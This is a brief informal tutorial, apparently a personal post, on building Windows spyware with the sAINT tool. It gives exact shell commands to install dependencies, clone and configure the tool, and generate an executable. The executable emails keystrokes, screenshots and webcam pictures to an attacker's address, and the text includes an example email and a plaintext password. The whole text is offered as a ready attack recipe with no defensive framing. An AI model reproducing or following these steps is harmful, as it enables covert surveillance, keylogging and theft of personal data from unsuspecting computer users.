Basically this is how to hack a windows based computer by creating an

.exe runnable file or a .jar runnable file and then sending information

IE keylogger, screenshots and webcam pics to an email account. DONT

USE YOUR OWN EMAIL ACCOUNT!

Using parrot os on my macbook

first install maven and java jdk 8

sudo apt install maven default-jdk default-jre openjdk-8-jdk openjdk-8-jre -y

To generate .EXE files you will also need to install this line

sudo apt install zlib1g-dev libncurses5-dev lib32z1 lib32ncurses5 -y

(I couldn't get this to work for some reason but I guess it still

is able to compile a .exe file for some reason?)

Then Clone this repo

git clone https://github.com/tiagorlampert/sAINT.git

go to folder

cd sAINT

install and configure

chmod +x configure.sh

./configure.sh

Run it

chmod +x sAINT.jar

./sAINT.jar

When prompted press enter and then put in your

email that you want all of the files to go to

(IE <PeterPanHacks@gmail.com>)

Pass is thatsmellything

Follow the prompts when asked what you want to

be sent. The characters one is how many keystrokes

you want in each email.

Your file will then be saved in the /target folder

Then just run it on a computer and it should work!
